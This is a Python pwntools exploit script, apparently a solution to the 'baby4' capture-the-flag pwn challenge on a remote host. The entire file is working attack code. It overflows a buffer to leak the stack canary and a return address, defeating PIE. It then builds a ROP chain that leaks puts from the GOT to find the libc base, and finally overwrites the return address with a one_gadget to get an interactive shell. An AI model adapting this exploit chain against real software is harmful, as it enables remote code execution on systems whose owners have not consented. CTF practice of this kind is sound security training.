from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
r = remote('baby-01.pwn.beer', 10004)
#r = process('./baby4')
#gdb.attach(r)

elf = ELF('./baby4')
puts_got = elf.got['puts']
puts_plt = elf.symbols['puts']
libc = elf.libc
libc_puts_offset = libc.symbols['puts']
one_gadget_offset = [0x4f2c5,0x4f322,0x10a38c][0]

r.sendlineafter('<-- ', 'a'*0x48 + 'A')
r.recvuntil('A')
canary = u64('\x00' + r.recv(7))
ret = u64(r.recvuntil('\n')[:-1].ljust(8,'\x00'))
pie = ret - 0xd10

gg = flat(
        pie+0xd73,
        pie+puts_got,
        pie+puts_plt,
        pie+0x8f0
)

p = 'a' * 0x48
p += p64(canary)
p += 'a' * 8
p += gg

r.sendlineafter('<-- ', p)
r.sendlineafter('<-- ', '')

libc_puts = u64((r.recvuntil('\n')[:-1]).ljust(8,'\x00'))
libc_base = libc_puts - libc_puts_offset
one_gadget = libc_base + one_gadget_offset

p = 'a' * 0x48
p += p64(canary)
p += 'a' * 8
p += p64(one_gadget)

r.sendlineafter('<-- ', p)
r.sendlineafter('<-- ', '')

r.interactive()
